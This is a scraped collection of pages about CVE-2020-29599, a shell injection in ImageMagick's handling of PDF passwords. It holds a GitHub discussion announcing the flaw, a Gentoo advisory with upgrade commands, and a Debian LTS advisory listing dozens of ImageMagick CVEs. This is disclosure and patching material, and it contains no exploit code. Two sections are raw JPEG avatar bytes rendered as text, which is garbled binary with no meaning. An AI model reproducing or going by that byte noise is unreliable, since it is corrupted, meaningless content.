 (51st percentile)

### Weaknesses

[CWE-91](/advisories?query=cwe%3A91)

### CVE ID

CVE-2020-29599

### GHSA ID

GHSA-685x-r4m9-ffxr

### Source code

No known source code

Dependabot alerts are not supported on this advisory because it does not have a package from a supported ecosystem with an affected and fixed version.

[Learn more about GitHub language support](https://docs.github.com/get-started/learning-about-github/github-language-support#about-supported-languages)

 Loading

Checking history

See something to contribute?
[Suggest improvements for this vulnerability](/advisories/GHSA-685x-r4m9-ffxr/improve).

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_e81069aa_20250119_112325.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FImageMagick%2FImageMagick%2Fdiscussions%2F2851)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FImageMagick%2FImageMagick%2Fdiscussions%2F2851)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fdiscussions%2Fshow&source=header-repo&source_repo=ImageMagick%2FImageMagick)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[ImageMagick](/ImageMagick)
/
**[ImageMagick](/ImageMagick/ImageMagick)**
Public

* [Notifications](/login?return_to=%2FImageMagick%2FImageMagick) You must be signed in to change notification settings
* [Fork
  1.4k](/login?return_to=%2FImageMagick%2FImageMagick)
* [Star
   12.6k](/login?return_to=%2FImageMagick%2FImageMagick)

* [Code](/ImageMagick/ImageMagick)
* [Issues
  119](/ImageMagick/ImageMagick/issues)
* [Pull requests
  4](/ImageMagick/ImageMagick/pulls)
* [Discussions](/ImageMagick/ImageMagick/discussions)
* [Actions](/ImageMagick/ImageMagick/actions)
* [Security](/ImageMagick/ImageMagick/security)
* [Insights](/ImageMagick/ImageMagick/pulse)

Additional navigation options

* [Code](/ImageMagick/ImageMagick)
* [Issues](/ImageMagick/ImageMagick/issues)
* [Pull requests](/ImageMagick/ImageMagick/pulls)
* [Discussions](/ImageMagick/ImageMagick/discussions)
* [Actions](/ImageMagick/ImageMagick/actions)
* [Security](/ImageMagick/ImageMagick/security)
* [Insights](/ImageMagick/ImageMagick/pulse)

# Shell injection via PDF password support in ImageMagick 7 #2851

[cure53alexander](/cure53alexander)
announced in
[Announcements](/ImageMagick/ImageMagick/discussions/categories/announcements)

[Shell injection via PDF password support in ImageMagick 7](#top)
#2851

[![@cure53alexander](https://avatars.githubusercontent.com/u/26442421?s=40&v=4)
cure53alexander](/cure53alexander)

Nov 21, 2020
·
1 comments
·
3 replies

[Return to top](#top)

Discussion options

# {{title}}

Something went wrong.

Quote reply

## [cure53alexander](/cure53alexander) [Nov 21, 2020](#discussion-34101)

 -

| Hi all. I discovered a vulnerability in ImageMagick regarding the handling of the "-authenticate" parameter, which allows to set a password for password protected PDF files. The user controlled password was not properly escaped/sanitized and it was therefore possible to inject additional shell commands. I reported this vulnerability to the ImageMagick team and after some back and forth via email, the issue was addressed correctly (given my own understanding of the code and the issue). I created a blogpost describing the issue more in depth: <https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html>  I want to thank the IM team to not only adressing this quickly but also allowing me give feedback regarding the ways to address this problem.  cheers, Alex |
| --- |

Beta
Was this translation helpful?
Give feedback.

4
 You must be logged in to vote

All reactions

## Replies: 1 comment · 3 replies

* [Oldest](/ImageMagick/ImageMagick/discussions/2851?sort=old)
* [Newest](/ImageMagick/ImageMagick/discussions/2851?sort=new)
* [Top](/ImageMagick/ImageMagick/discussions/2851?sort=top)

Comment options

# {{title}}

Something went wrong.

Quote reply

### [Beuc](/Beuc) [Nov 25, 2020](#discussioncomment-138807)

 -

| Hi, was this assigned a CVE ID? |
| --- |

Beta
Was this translation helpful?
Give feedback.

1
 You must be logged in to vote

All reactions

3 replies

[![@maxcrees](https://avatars.githubusercontent.com/u/118271?s=60&v=4)](/maxcrees)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [maxcrees](/maxcrees) [Dec 8, 2020](#discussioncomment-167478)

 -

| It appears [CVE-2020-29599](https://nvd.nist.gov/vuln/detail/CVE-2020-29599) has been assigned to this issue. |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

[![@weidongkx](https://avatars.githubusercontent.com/u/7512609?s=60&v=4)](/weidongkx)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [weidongkx](/weidongkx) [Dec 17, 2020](#discussioncomment-218282)

 -

| [CVE-2020-29599](https://github.com/advisories/GHSA-685x-r4m9-ffxr "CVE-2020-29599") |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

[![@Crispy-fried-chicken](https://avatars.githubusercontent.com/u/65160922?s=60&v=4)](/Crispy-fried-chicken)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [Crispy-fried-chicken](/Crispy-fried-chicken) [Dec 17, 2024](#discussioncomment-11590835)

 -

| Is there any fix commit? |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2FImageMagick%2FImageMagick%2Fdiscussions%2F2851)

Category

[📢

Announcements](/ImageMagick/ImageMagick/discussions/categories/announcements)

Labels

None yet

5 participants

[![@cure53alexander](https://avatars.githubusercontent.com/u/26442421?s=48&v=4)](/cure53alexander) [![@maxcrees](https://avatars.githubusercontent.com/u/118271?s=48&v=4)](/maxcrees) [![@Beuc](https://avatars.githubusercontent.com/u/980977?s=48&v=4)](/Beuc) [![@weidongkx](https://avatars.githubusercontent.com/u/7512609?s=48&v=4)](/weidongkx) [![@Crispy-fried-chicken](https://avatars.githubusercontent.com/u/65160922?s=48&v=4)](/Crispy-fried-chicken)

Heading

Bold

Italic

Quote

Code

Link

---

Numbered list

Unordered list

Task list

---

Attach files

Mention

Reference

Menu

* Heading
* Bold
* Italic
* Quote
* Code
* Link
* Numbered list
* Unordered list
* Task list
* Attach files
* Mention
* Reference

# Select a reply

 Loading

  [Create a new saved reply](/settings/replies?return_to=1)

 👍
1
  reacted with thumbs up emoji

 👎
1
  reacted with thumbs down emoji

 😄
1
  reacted with laugh emoji

 🎉
1
  reacted with hooray emoji

 😕
1
  reacted with confused emoji

 ❤️
1
  reacted with heart emoji

 🚀
1
  reacted with rocket emoji

 👀
1
  reacted with eyes emoji

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from avatars.githubusercontent.com_a2069375_20250119_131617.html ===
���� �  

 $.' ",#(7),01444'9=82<.342 
2!!22222222222222222222222222222222222222222222222222��  < <" ���          
   } !1AQa"q2���#B��R��$3br�
%&'()\*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz�������������������������������������������������������������������������       
  w !1AQaq"2�B���� #3R�br�
$4�%�&'()\*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������   ? ���:�#?g�� A�|]��:X9 ���%f��� ^����4�$hs�z���u/�"�)�wl؛z�=��tʣz����^�V1�6� ��� E�w� ��;�icԯ�R����lč�;uW}�� X}c}���zz���v\_s��J�ŶvE�DQ\N��\_�7�|7-����E$NYpp�\_�<� A�� �R�56e]ex���� g����5�� ����S���� �י���6��/��މ��Uwa�'�UCFLއ�� �/���U����x�� �^�H5���x�HR-����:~8�C�� �4��)$�kr-���ܹ�]��"�� Q��o%���I畷<�6Y���E���v��.�g��Ώk����0f��FV0U{��\rZKq:Cn�$��QW������[��ے�l�"�������
��\_�\�A����<������k�G��4?�g� ~��~|F�����.,��q)&n��8 :g���u�Zi� ��uH-��'ǰ�x�jM��(�<�� 0[/��+ɾ"�VZ�<�;h����F���3P� ���\_>8�I��1O-���¼���Ն��%���%�۠ܧ<��I����և���U��� nK���ϘrA#�d����/�����z"�v� ��<:e��%Dj;��z��\*;�9�� #ڷ|;\*��T�љFTg�sY��\_��(\_�A?�[6�G��6~��g��q���H��̶��n �u��s�3C1��c=�1,1<Ķ���}+���d�ft�6��נ�l�6��Bۑ߃��\*�%��N�Y�}��$M3�!�D���>�kϚ����<Vl�8�W���KqVRk��<���b�0�,M}}�j�6�u=pj���apĜrH�g��q�SL�z�f�ҕd�"��P\_���EW�6$6@�ҫ����Ji9�+!�ӇZ�5�';�y��I�Aq�4)������������EN���S򦐙v8�vP���}<�� �jٻ�F �0 ��5�������r���
Q'��

=== Content from security.gentoo.org_ca598f1a_20250119_112326.html ===

[![Gentoo](https://assets.gentoo.org/tyrian/v2/site-logo.png)](/ "Back to the homepage")
Security

[**Get Gentoo!**](https://get.gentoo.org/)
gentoo.org sites
[gentoo.org](https://www.gentoo.org/ "Main Gentoo website")
[Wiki](https://wiki.gentoo.org/ "Find and contribute documentation")
[Bugs](https://bugs.gentoo.org/ "Report issues and find common issues")
[Forums](https://forums.gentoo.org/ "Discuss with the community")
[Packages](https://packages.gentoo.org/ "Find software for your Gentoo")

[Planet](https://planet.gentoo.org/ "Find out what's going on in the developer community")
[Archives](https://archives.gentoo.org/ "Read up on past discussions")
[Sources](https://sources.gentoo.org/ "Browse our source code")

[Infra Status](https://infra-status.gentoo.org/ "Get updates on the services provided by Gentoo")

* [Home](/)
* [Stay informed](/subscribe)
* [Advisories](/glsa)

# ImageMagick: Command injection — GLSA **202101-36**

A vulnerability in ImageMagick's handling of PDF was discovered
possibly allowing code execution.

### Affected packages

| Package | **media-gfx/imagemagick** on all architectures |
| --- | --- |
| Affected versions | < **7.0.10.41-r1**< **6.9.11.41-r1** |
| Unaffected versions | >= **7.0.10.41-r1**>= **6.9.11.41-r1** |

### Background

A collection of tools and libraries for many image formats.

### Description

A flaw in ImageMagick’s handling of password protected PDFs was
discovered.

### Impact

A remote attacker could entice a user to open a specially crafted PDF
using ImageMagick possibly resulting in execution of arbitrary code with
the privileges of the process or a Denial of Service condition.

### Workaround

Do not open untrusted PDFs.

### Resolution

All ImageMagick 7 users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose
 ">=media-gfx/imagemagick-7.0.10.41-r1"

```

All ImageMagick 6 users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose
 ">=media-gfx/imagemagick-6.9.11.41-r1"

```
### References

* [CVE-2020-29599](https://nvd.nist.gov/vuln/detail/CVE-2020-29599)

**Release date**

January 29, 2021

**Latest revision**

January 29, 2021: 1

**Severity**

normal

**Exploitable**

remote

**Bugzilla entries**

* [756829](https://bugs.gentoo.org/show_bug.cgi?id=756829)

### Questions or comments?

Please feel free to contact us.

**© 2001–2020 Gentoo Foundation, Inc.**



=== Content from bugs.gentoo.org_0734e850_20250119_131618.html ===

[![Gentoo Websites Logo](extensions/Gentoo/web/gentoo_org.png)](/ "Go to the Gentoo Bugzilla homepage")
Go to:
[Gentoo Home](https://www.gentoo.org/)
[Documentation](https://www.gentoo.org/support/documentation/)
[Forums](https://forums.gentoo.org/)
[Lists](https://www.gentoo.org/get-involved/mailing-lists/)
[Bugs](/)
[Planet](https://planet.gentoo.org/)
[Store](https://www.gentoo.org/inside-gentoo/stores/)
[Wiki](https://wiki.gentoo.org/)
**[Get Gentoo!](https://www.gentoo.org/downloads/)**

Gentoo's Bugzilla – Search by bug number

* [Home](./)
* | [New](enter_bug.cgi?format=guided)–[[Ex]](enter_bug.cgi)
* | [Browse](describecomponents.cgi)
* | [Search](query.cgi)
* | [Privacy Policy](https://wiki.gentoo.org/wiki/Foundation%3APrivacy_Policy)
* |

  [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
* | [Reports](report.cgi)
* |
  [Requests](request.cgi)
* |
  [New Account](createaccount.cgi)
* |
  [Log In](show_bug.cgi?keywords=id&GoAheadAndLogIn=1)

  [x]
* |
  [Forgot Password](show_bug.cgi?keywords=id&GoAheadAndLogIn=1#forgot)
  Login:

  [x]

You may find a single bug by entering its bug id here:

* + [Home](./)
  + | [New](enter_bug.cgi?format=guided)–[[Ex]](enter_bug.cgi)
  + | [Browse](describecomponents.cgi)
  + | [Search](query.cgi)
  + | [Privacy Policy](https://wiki.gentoo.org/wiki/Foundation%3APrivacy_Policy)
  + |

    [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
  + | [Reports](report.cgi)
  + |
    [Requests](request.cgi)
  + |
    [New Account](createaccount.cgi)
  + |
    [Log In](show_bug.cgi?keywords=id&GoAheadAndLogIn=1)

    [x]
  + |
    [Forgot Password](show_bug.cgi?keywords=id&GoAheadAndLogIn=1#forgot)
    Login:

    [x]



=== Content from avatars.githubusercontent.com_7a108622_20250119_131617.html ===
���� �  

 $.' ",#(7),01444'9=82<.342 
2!!22222222222222222222222222222222222222222222222222��  < <" ���          
   } !1AQa"q2���#B��R��$3br�
%&'()\*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz�������������������������������������������������������������������������       
  w !1AQaq"2�B���� #3R�br�
$4�%�&'()\*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������   ? �!��5��K�-G�Ѹ�:������6�"rU�<�5n����� �q�/|`�ƴ�D����>� �p��07���Yx��7}ƒ�����ӭup��Ƅ��q�k/Q��9�J��:�z������4���4�ʋ�Ѧ8c��
SP���0Coc�|�q��RrkԵ���m����I%�A��N}+�u\_Z�p��x~�)�efa�G��
�Nĺ��>�u��j���W\_�����W2�R��r:�[����pI�>�h�T\
�-�����:-O�SQW��\*h��#�r/���@�sw���T�1��ߓX���j��2�1ֱ!�x��c �I;M2zw��v�����r�7��=�`�c;.�8�^�v��[�\�u�=������A���򌁌�k�����#��d�9(��X&��l.���[�FdÎ�A�J��j���d�<���5 du�V����}/T7��ln@�v�c�:s���O��kt�Z��ztR\�
��N߅kCd�9p�c�y�g��i��oq6<��8�'ڶ�Ė��n&��I�-W$�kjQԮ�"ܭ��\*j�2`����~��=U!�������9����(~Ϭ�IBJ�r8���@;;�FVH��^�z`ֱ��$��ɴ\H%
�X�1�ǯ�rk��쨾\�������]e�w7�.-�7r[�Fd�ݎ���4��vdz�Ż]#P���j �� \*��ѹ��N�Q�u ��0\۫�����׊�N��V�mD��[��vy�kz�ª`�Q]H��  ����+xd�!������|V��[t��6�NX?7P���u��J��R �IGI�x�V�S���"3(�ܫ\Gֻ�|L�X�������e~���^0�w�I+��ZZd�-����~t�Η��.��\_���7�f}�0�c=�=� ֮���89�?��R�A�u?�;��5=!g}�l��9,��+��PH�4��&�6o����[��|�ݷ=)P3.AǱ����WaF
j�D\��

=== Content from lists.debian.org_c0ef4e1c_20250119_112326.html ===


---

[[Date Prev](msg00007.html)][[Date Next](msg00009.html)]
[[Thread Prev](msg00007.html)][[Thread Next](msg00009.html)]
[[Date Index](maillist.html#00008)]
[[Thread Index](threads.html#00008)]

# [SECURITY] [DLA 3357-1] imagemagick security update

---

* *To*: <debian-lts-announce@lists.debian.org>
* *Subject*: [SECURITY] [DLA 3357-1] imagemagick security update
* *From*: Bastien Roucaries <rouca@debian.org>
* *Date*: Sat, 11 Mar 2023 19:39:30 +0000
* *Message-id*: <[[🔎]](/msgid-search/1d4d33c61795a16ec6114090b75ad9d7.rouca%40debian.org) [1d4d33c61795a16ec6114090b75ad9d7.rouca@debian.org](msg00008.html)>
* *Mail-followup-to*: debian-lts@lists.debian.org
* *Reply-to*: debian-lts@lists.debian.org

---

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

- -------------------------------------------------------------------------
Debian LTS Advisory DLA-3357-1                debian-lts@lists.debian.org
<https://www.debian.org/lts/security/>                    Bastien RoucariÃ¨s
March 11, 2023                                <https://wiki.debian.org/LTS>
- -------------------------------------------------------------------------

Package        : imagemagick
Version        : 8:6.9.10.23+dfsg-2.1+deb10u2
CVE ID         : CVE-2020-19667 CVE-2020-25665 CVE-2020-25666 CVE-2020-25674
		 CVE-2020-25675 CVE-2020-25676 CVE-2020-27560 CVE-2020-27750
		 CVE-2020-27751 CVE-2020-27754 CVE-2020-27756 CVE-2020-27757
		 CVE-2020-27758 CVE-2020-27759 CVE-2020-27760 CVE-2020-27761
		 CVE-2020-27762 CVE-2020-27763 CVE-2020-27764 CVE-2020-27765
		 CVE-2020-27766 CVE-2020-27767 CVE-2020-27768 CVE-2020-27769
		 CVE-2020-27770 CVE-2020-27771 CVE-2020-27772 CVE-2020-27773
		 CVE-2020-27774 CVE-2020-27775 CVE-2020-27776 CVE-2020-29599
		 CVE-2021-3574 CVE-2021-3596 CVE-2021-20224 CVE-2022-44267
		 CVE-2022-44268
Debian Bug     : 1027164 1030767

Several vulnerabilities have been discovered in imagemagick that may
lead to a privilege escalation, denial of service or information leaks.

CVE-2020-19667

    A stack-based buffer overflow and unconditional jump was found in
    ReadXPMImage in coders/xpm.c

CVE-2020-25665

    An out-of-bounds read in the PALM image coder was found in
    WritePALMImage in coders/palm.c

CVE-2020-25666

    An integer overflow was possible during simple math
    calculations in HistogramCompare() in MagickCore/histogram.c

CVE-2020-25674

    A for loop with an improper exit condition was found that can
    allow an out-of-bounds READ via heap-buffer-overflow in
    WriteOnePNGImage from coders/png.c

CVE-2020-25675

    A undefined behavior was found in the form of integer overflow
    and out-of-range values as a result of rounding calculations
    performed on unconstrained pixel offsets in the CropImage()
    and CropImageToTiles() routines of MagickCore/transform.c

CVE-2020-25676

    A undefined behavior was found in the form of integer overflow
    and out-of-range values as a result of rounding calculations
    performed on unconstrained pixel offsets in CatromWeights(),
    MeshInterpolate(), InterpolatePixelChannel(),
    InterpolatePixelChannels(), and InterpolatePixelInfo(),
    which are all functions in /MagickCore/pixel.c

CVE-2020-27560

    A division by Zero was found in OptimizeLayerFrames in
    MagickCore/layer.c, which may cause a denial of service.

CVE-2020-27750

    A division by Zero was found in MagickCore/colorspace-private.h
    and MagickCore/quantum.h, which may cause a denial of service

CVE-2020-27751

    A undefined behavior was found in the form of values outside the
    range of type `unsigned long long` as well as a shift exponent
    that is too large for 64-bit type in MagickCore/quantum-export.c

CVE-2020-27754

    A integer overflow was found in IntensityCompare() of
    /magick/quantize.c

CVE-2020-27756

    A division by zero was found in ParseMetaGeometry() of
    MagickCore/geometry.c.
    Image height and width calculations can lead to
    divide-by-zero conditions which also lead to undefined behavior.

CVE-2020-27757

    A undefined behavior was found in MagickCore/quantum-private.h
    A floating point math calculation in
    ScaleAnyToQuantum() of /MagickCore/quantum-private.h could lead to
    undefined behavior in the form of a value outside the range of type
    unsigned long long.

CVE-2020-27758

    Undefined behavior was found in the form of values outside the
    range of type `unsigned long long` in coders/txt.c

CVE-2020-27759

    In IntensityCompare() of /MagickCore/quantize.c, a
    double value was being casted to int and returned, which in some
    cases caused a value outside the range of type `int` to be
    returned.

CVE-2020-27760

    In `GammaImage()` of /MagickCore/enhance.c, depending
    on the `gamma` value, it's possible to trigger a
    divide-by-zero condition when a crafted input file
    is processed.

CVE-2020-27761

    WritePALMImage() in /coders/palm.c used size_t casts
    in several areas of a calculation which could lead to
    values outside the range of representable type `unsigned long`
    undefined behavior when a crafted input file was processed.

CVE-2020-27762

    Undefined behavior was found in the form of values outside the
    range of type `unsigned char` in coders/hdr.c

CVE-2020-27763

    Undefined behavior was found in the form of math division by
    zero in MagickCore/resize.c

CVE-2020-27764

    Out-of-range values was found under some
    circumstances when a crafted input file is processed in
    /MagickCore/statistic.c

CVE-2020-27765

    Undefined behavior was found in the form of math division by
    zero in MagickCore/segment.c when a crafted file is processed

CVE-2020-27766

    A crafted file that is processed by ImageMagick could trigger
    undefined behavior in the form of values outside the range of
    type `unsigned long`

CVE-2020-27767

    Undefined behavior was found in the form of values outside the
    range of types `float` and `unsigned char` in MagickCore/quantum.h

CVE-2020-27768

    An outside the range of representable values of type
    `unsigned int` was found in MagickCore/quantum-private.h

CVE-2020-27769

    An outside the range of representable values of type
    `float` was found in MagickCore/quantize.c

CVE-2020-27770

    Due to a missing check for 0 value of
    `replace_extent`, it is possible for offset `p` to overflow in
    SubstituteString()

CVE-2020-27771

    In RestoreMSCWarning() of /coders/pdf.c there are
    several areas where calls to GetPixelIndex() could result in values
    outside the range of representable for the `unsigned char` type

CVE-2020-27772

    Undefined behavior was found in the form of values outside the
    range of type `unsigned int` in coders/bmp.c

CVE-2020-27773

    Undefined behavior was found in the form of values outside the
    range of type `unsigned char` or division by zero

CVE-2020-27774

    A crafted file that is processed by ImageMagick could trigger
    undefined behavior in the form of a too large shift for
    64-bit type `ssize_t`.

CVE-2020-27775

    Undefined behavior was found in the form of values outside the
    range of type `unsigned char` in MagickCore/quantum.h

CVE-2020-27776

    A crafted file that is processed by ImageMagick could trigger
    undefined behavior in the form of values outside the range of
    type unsigned long.

CVE-2020-29599

    ImageMagick mishandles the -authenticate option, which
    allows setting a password for password-protected PDF files.
    The user-controlled password was not properly escaped/sanitized
    and it was therefore possible to inject additional
    shell commands via coders/pdf.c.
    On debian system, by default the imagemagick policy
    mitigated this CVE.

CVE-2021-3574

    A memory leak was found converting a crafted TIFF file.

CVE-2021-3596

    A NULL pointer dereference was found in ReadSVGImage() in
    coders/svg.c

CVE-2021-20224

    An integer overflow issue was discovered in ImageMagick's
    ExportIndexQuantum() function in MagickCore/quantum-export.c.

CVE-2022-44267

    A Denial of Service was found. When it parses a PNG image,
    the convert process could be left waiting for stdin input.

CVE-2022-44268

    An Information Disclosure was found. When it parses a PNG image,
    (e.g., for resize), the resulting image could have embedded
    the content of an arbitrary. file.

For Debian 10 buster, these problems have been fixed in version
8:6.9.10.23+dfsg-2.1+deb10u2.

We recommend that you upgrade your imagemagick packages.

For the detailed security status of imagemagick please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/imagemagick>

Further information about Debian LTS security advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://wiki.debian.org/LTS>
-----BEGIN PGP SIGNATURE-----

iQIzBAEBCgAdFiEEXQGHuUCiRbrXsPVqADoaLapBCF8FAmQM2PIACgkQADoaLapB
CF9Mag/+Pnnmozh7UJX+WALezTQBJYQG67E/mMIOVt4w460WgXCKj9oQVenWFnhM
hY4ZpKrdgCvFrW0fr/m9jLPoQuYN9fJrhvRcnQzyq60Le9X8QRDkjPzYGjWfBrJg
s/whu8R2l6qIed97Om1TN0uryw+M2v+Jsnw5KiNKL2FkUayXmzuiEb95YIt4MSNh
qW4Nirc7Ym3/M01RA3tiKiHOfYBk17eeITb2R/307mhKUXpWBtv9BJrTKdhz1dVJ
+0XXTkY0WNXtRl1mmE1w+xSEsP3kH8Hx40URs1tZ7yTHY2jBbDilJh/Br3OtqLCX
y3+2Snm0OZNwouTki9xjlhI0bgFSZsQykV8hbxyVS4rHaG/z2YeUmCrBvtfeNHmn
K3nB0YWTOssP9YfdVMpNABE6L+mTMiuj/xr7+X8Dmw5q+S8TE9+2u1RGOcolEVRB
KwOCcv/ZF/jAiWbifWd/QdN4jy+Sq5byRcsuTbXHZhbwu0l6yxMTWAP2fXNIlr4r
iHRA9bmnfFHdzzaUp8vRmUgOup5RmyWratm00XKkFLbAdMmUTJl16CQ2A7ESGyKM
FXH0raG00UevheoRYuSy+6K9vA/D5u6TdTmwsgmgJnspHZcnwlApiC03t9e7cX64
EJCCPy3pFsz22A5ZOJrjIDVi+P1WZCsLjk2D3xOdliiV6uHr4+o=
=Ra+j
-----END PGP SIGNATURE-----

```

---


